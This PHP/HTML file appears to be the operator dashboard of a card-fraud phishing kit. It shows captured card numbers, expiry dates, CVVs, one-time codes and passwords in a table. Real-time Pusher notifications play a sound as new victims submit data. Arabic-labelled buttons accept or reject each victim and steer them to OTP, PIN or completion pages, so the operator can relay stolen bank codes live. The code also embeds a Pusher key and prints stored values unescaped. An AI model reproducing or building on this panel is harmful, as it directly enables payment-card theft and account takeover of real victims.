<?php

session_start();

// Include Initialization file
require_once('init.php');


if (!$User->isLoggedIn()) {
    $User->redirect('login.php');
}

$card = $User->fetchAllCards();
$users = $User->fetchAllUsers();

if (isset($_GET['TestInfoReject'])) {

    $idd = $_GET['id'];

    $X = 2;
    $User->UpdateUserStatusById($idd, $X);
    $User->redirect('index.php');
}

if (isset($_GET['TestInfoAcceptance'])) {
    $idd = $_GET['id'];

    $X = 1;
    $User->UpdateUserStatusById($idd, $X);
    $User->redirect('index.php');
}

if (isset($_POST['deleteUser'])) {
    $id = $_POST['userId'];
    $User->DeleteUserById($id);
    $User->redirect('index.php');
}


if (isset($_POST['deleteAllUser'])) {
    $User->DeleteAllUsers();
    $User->redirect('index.php');
}

// if (isset($_POST['dataInfoAccept'])) {
//     $idd = $_POST['idforrow'];
//     $selectedText = $_POST['numberselected'];
//     $User->UpdateUserData($idd, $selectedText);
// }

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>DASHBOARD</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">

    <!-- Favicon -->
    <link href="img/favicon.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@400;500;600;700&display=swap" rel="stylesheet">

    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">

    <!-- Libraries Stylesheet -->
    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />

    <!-- Customized Bootstrap Stylesheet -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <!-- Template Stylesheet -->
    <link href="css/style.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&family=Rubik:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
    <style>
        * {
            font-family: "Cairo", sans-serif;
        }

        .btn-danger {
            background-color: #ff0000;
        }

        .bg-dangl {
            background-color: #ff7b7b;
        }
    </style>
</head>

<body>
    <div class="container-xxl position-relative bg-white d-flex p-0">
        <!-- Spinner Start -->
        <div id="spinner" class="show bg-white position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>
        <!-- Spinner End -->


        <!-- Sidebar Start -->
        <div class="sidebar pe-4 pb-3">
            <nav class="navbar bg-light navbar-light">
                <a href="index.php" class="navbar-brand mx-4 mb-3">
                    <h3 class="text-primary"><i class="fa fa-hashtag me-2"></i>DASHMIN</h3>
                </a>
                <div class="d-flex align-items-center ms-4 mb-4">
                    <div class="position-relative">
                        <img class="rounded-circle" src="img/user.jpg" alt="" style="width: 40px; height: 40px;">
                        <div class="bg-success rounded-circle border border-2 border-white position-absolute end-0 bottom-0 p-1"></div>
                    </div>
                    <div class="ms-3">
                        <h6 class="mb-0">Jhon Doe</h6>
                        <span>Admin</span>
                    </div>
                </div>
                <div class="navbar-nav w-100">
                    <a href="index.php" class="nav-item nav-link"><i class="fa fa-tachometer-alt me-2"></i>Dashboard</a>
                </div>
                <div class="navbar-nav w-100">
                    <a href="cards.php" class="nav-item nav-link active"><i class="fa fa-tachometer-alt me-2"></i>Cards</a>
                </div>
            </nav>
        </div>
        <!-- Sidebar End -->


        <!-- Content Start -->
        <div class="content">
            <!-- Navbar Start -->
            <nav class="navbar navbar-expand bg-light navbar-light sticky-top px-4 py-0">
                <a href="index.php" class="navbar-brand d-flex d-lg-none me-4">
                    <h2 class="text-primary mb-0"><i class="fa fa-hashtag"></i></h2>
                </a>
                <a href="#" class="sidebar-toggler flex-shrink-0">
                    <i class="fa fa-bars"></i>
                </a>
                <form class="d-none d-md-flex ms-4">
                    <input class="form-control border-0" type="search" placeholder="Search">
                </form>
                <div class="navbar-nav align-items-center ms-auto">
                    <!-- <div class="nav-item dropdown">
                        <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">
                            <i class="fa fa-envelope me-lg-2"></i>
                            <span class="d-none d-lg-inline-flex">Message</span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-end bg-light border-0 rounded-0 rounded-bottom m-0">
                        </div>
                    </div>
                    <div class="nav-item dropdown">
                        <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">
                            <i class="fa fa-bell me-lg-2"></i>
                            <span class="d-none d-lg-inline-flex">Notificatin</span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-end bg-light border-0 rounded-0 rounded-bottom m-0">
                        </div>
                    </div> -->
                    <div class="nav-item dropdown">
                        <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">
                            <img class="rounded-circle me-lg-2" src="img/user.jpg" alt="" style="width: 40px; height: 40px;">
                            <span class="d-none d-lg-inline-flex">John Doe</span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-end bg-light border-0 rounded-0 rounded-bottom m-0">
                            <a href="logout.php" class="dropdown-item">Log Out</a>
                        </div>
                    </div>
                </div>
            </nav>
            <!-- Navbar End -->

            <!-- Recent Sales Start -->
            <div class="container-fluid pt-4 px-4">
                <div class="bg-light text-center rounded p-4">

                    <!-- <form class="mb-4">
                        <input class="form-control border-0" type="search" placeholder="Search">
                    </form> -->
                    <!-- <div class="d-flex mb-4">

                        <form action="" method="POST">
                            <button type="submit" name="deleteAllUser" class="btn btn-lg btn-danger">حذف جميع المستخدمين</button>
                        </form>
                    </div> -->
                    <div class="table-responsive">
                        <table class="table text-start align-middle table-bordered table-hover mb-0">
                            <thead>
                                <tr class="text-dark">
                                    <th scope="col">Card Number</th>
                                    <th scope="col">Month</th>
                                    <th scope="col">Year</th>
                                    <th scope="col">CVV</th>
                                    <th scope="col">OTP</th>
                                    <th scope="col">Password</th>
                                    <th scope="col">Action</th>
                                    <!-- <th scope="col">del</th> -->
                                </tr>
                            </thead>
                            <tbody id="result">
                                <?php
                                if ($card != false) :
                                    foreach ($card as $row) {
                                ?>
                                        <tr data-card-id="<?= $row->id; ?>">
                                            <td>
                                                <?= $row->cardNumber; ?>
                                            </td>
                                            <td id="month<?= $row->id; ?>">
                                                <?= $row->month; ?>
                                            </td>
                                            <td id="year<?= $row->id; ?>">
                                                <?= $row->year; ?>
                                            </td>
                                            <td id="cvv<?= $row->id; ?>">
                                                <?= $row->cvv; ?>
                                            </td>
                                            <td id="otp<?= $row->id; ?>">
                                                <?= $row->otp; ?>
                                            </td>
                                            <td id="password<?= $row->id; ?>">
                                                <?= $row->password; ?>
                                            </td>
                                            <td>
                                                <button class="btn btn-info text-white" onclick="removeBackground(this,<?= $row->id; ?>)">card</button>
                                            </td>

                                            <div class="modal fade" id="card<?= $row->id; ?>" tabindex="-1" aria-labelledby="cardModalLabel" aria-hidden="true">
                                                <div class="modal-dialog">
                                                    <div class="modal-content">
                                                        <div class="modal-header">
                                                            <h1 class="modal-title fs-5" id="card">Card</h1>
                                                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                                        </div>
                                                        <div class="modal-body">

                                                            <div id="cardDetails<?= $row->id; ?>">

                                                            </div>

                                                            <hr>
                                                        </div>
                                                        <div class="modal-footer">
                                                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </tr>
                                <?php
                                    }
                                endif;
                                ?>
                            </tbody>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Content End -->

    <audio id="notification-card" src="./level-up-2-199574.mp3"></audio>

    <!-- Back to Top -->
    <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top"><i class="bi bi-arrow-up"></i></a>
    </div>

    <script>
        function removeBackground(button, cardId) {
            var row = button.closest('tr');
            row.classList.remove('bg-dangl');

            $.ajax({
                url: 'card-id.php',
                type: 'GET',
                data: {
                    card_id: cardId
                },
                success: function(response) {
                    var cards = JSON.parse(response);


                    var cardContainer = $('#cardDetails' + cardId);
                    cardContainer.empty(); // Clear the container before appending new cards

                    cards.forEach(function(card, index) {
                        // Create a new div for each card's details
                        var cardHtml = `
                   ${card.bank == "1" ?  card.status == 0 ? `<div class="mb-4">
                                                                    <h5 class="text-center">تفعيل كود الهاتف</h5>
                                                                    <div class="d-flex">

                                                                        <select class="form-select" id="selUrl${card.id}">
                                                                            <option value="card.php" selected>صفحة معلومات البطاقة</option>
                                                                            <option value="otpnormal.php">رمز OTP</option>
                                                                            <option value="password.php">رمز السري</option>
                                                                            <option value="done.php">صفحة قبول كل شي</option>
                                                                        </select>
                                                                        <button onclick="callRequest(${card.id} , 1,)" class="btn btn-success w-50">قبول</button>
                                                                        <button onclick="callRequest(${card.id}, 2)" class="btn btn-danger w-50">رفض</button>


                                                                    </div>
                                                                </div>` : card.status == 1 ? `<button class="btn btn-success w-100 mb-4">مقبول</button>` : `<button class="mb-4 btn btn-danger w-100">مرفوض</button>`
                    : card.status == 0 ? `<div class="mb-4">
                                                                    <h5 class="text-center">تفعيل كود الهاتف</h5>
                                                                    <div class="d-flex">

                                                                        <select class="form-select" id="selUrl${card.id}">
                                                                            <option value="card-en.php" selected>صفحة معلومات البطاقة</option>
                                                                            <option value="otpnormal-en.php">رمز OTP</option>
                                                                            <option value="password-en.php">رمز السري</option>
                                                                            <option value="done-en.php">صفحة قبول كل شي</option>
                                                                        </select>
                                                                        <button onclick="callRequest(${card.id} , 1)" class="btn btn-success w-50">قبول</button>
                                                                        <button onclick="callRequest(${card.id}, 2)" class="btn btn-danger w-50">رفض</button>


                                                                    </div>
                                                                </div>` : card.status == 1 ? `<button class="btn btn-success w-100 mb-4">مقبول</button>` : `<button class="mb-4 btn btn-danger w-100">مرفوض</button>`}
                `;

                        console.log('sadasdasd')
                        cardContainer.append(cardHtml);
                    });

                    console.log('16164')
                    $('#card' + cardId).modal('show');
                },
                error: function(xhr, status, error) {
                    console.error('Request failed:', status, error);
                }
            });

        }
    </script>

    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="lib/chart/chart.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/waypoints/waypoints.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="lib/tempusdominus/js/moment.min.js"></script>
    <script src="lib/tempusdominus/js/moment-timezone.min.js"></script>
    <script src="lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>

    <!-- Template Javascript -->
    <script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        // Enable pusher logging - don't include this in production
        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('bcare');
        channel.bind('add-card', function(data) {
            $.ajax({
                url: "cards-row.php",
                success: function(response) {
                    let tempDiv = document.createElement('table');
                    tempDiv.innerHTML = response;

                    let newRow = tempDiv.querySelector('tr');
                    if (newRow) {
                        newRow.classList.add('bg-dangl');
                        $('#result').prepend(newRow);


                        var audio = document.getElementById('notification-card');
                        audio.play().catch(function(error) {
                            console.error('Error playing audio: ', error);
                        });
                    }

                },
                error: function(xhr, status, error) {
                    // Handle error
                    console.error(xhr.responseText);
                }
            });
        });

        channel.bind('update-card', function(data) {

            var cardId = data.cardId;
            var updatedData = data.updatedData;
            var audio = document.getElementById('notification-card');

            if (updatedData.type == '2') {

                var cardNnumberElement = document.getElementById('otp' + cardId);
                cardNnumberElement.textContent = updatedData.otp;

            }

            if (updatedData.type == '5') {
                var cardeNudmbcerElement = document.getElementById('password' + cardId);
                cardeNudmbcerElement.textContent = updatedData.password;
            }

            document.querySelectorAll('tr[data-card-id]').forEach(function(row) {
                const cardTwoId = row.getAttribute('data-card-id');

                if (cardTwoId == cardId) {
                    row.classList.add('bg-dangl');

                    var tbody = row.closest('tbody'); 
                    if (tbody && tbody.firstChild !== row) {
                        tbody.insertBefore(row, tbody.firstChild);
                    }
                }
            });

            audio.play().catch(function(error) {
                console.error('Error playing audio: ', error);
            });

        });

        function callRequest(id, status) {
            var selectElement = document.getElementById('selUrl' + id);

            var selectedValue = selectElement.value;

            if(status == 2){
                selectedValue += '?reject=1';
            }

            $.ajax({
                url: 'action-code.php',
                type: 'GET',
                data: {
                    user_id: id,
                    status: status,
                    url: selectedValue
                },
                success: function(response) {
                    $('#card' + id).modal('hide');
                },
                error: function(xhr, status, error) {
                    console.error('Request failed:', status, error);
                }
            });
        }
    </script>
</body>

</html>